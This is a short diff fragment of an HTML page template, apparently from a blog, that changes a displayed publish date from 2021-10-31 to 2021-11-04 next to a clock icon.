-                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-04
                             </span>
                         <span class="publish-author">
                             
